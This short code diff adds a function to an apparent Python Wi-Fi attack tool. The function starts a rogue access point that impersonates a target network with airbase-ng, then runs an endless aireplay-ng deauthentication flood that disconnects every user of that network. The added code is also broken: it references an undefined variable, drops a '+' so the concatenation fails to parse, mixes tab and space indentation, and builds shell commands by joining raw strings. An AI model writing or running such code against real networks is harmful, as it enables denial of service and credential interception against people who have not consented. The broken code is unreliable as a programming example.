@@ -42,6 +42,10 @@ def network_sniff(interface_name, essid):
     print("CHANNEL: " + channel)
     return
 
+def deauth_all_users(essid, bssid, channel, inter): 
+	os.system("airbase-ng -a " + bssid + " --essid " + essid + " -c " + channel +" " + interface_name)
+    os.system("aireplay-ng --deauth 0 -a " + bssid + " " + interface_name " --ignore-negative-one")
+
 if __name__ == "__main__":
 
     os.system("rm tmpcap*")
